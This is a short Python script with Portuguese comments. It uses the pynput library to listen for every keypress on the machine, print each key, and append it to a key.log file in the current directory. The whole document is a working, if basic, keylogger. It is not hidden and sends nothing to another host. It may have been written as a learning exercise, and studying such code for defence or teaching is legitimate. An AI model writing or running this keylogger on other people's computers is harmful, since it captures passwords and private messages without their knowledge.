#bibliotecas:
from pynput.keyboard import Listener
import re
import os

#criação do arquivo de log:
arquivoLog = f'{os.getcwd()}/key.log'

#criação da função de leitura:
def capturar(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'Key.space', " ", tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)
    print(tecla, end='')
    with open(arquivoLog, "a") as log:
        log.write(tecla)

with Listener(on_press=capturar) as l:
    l.join()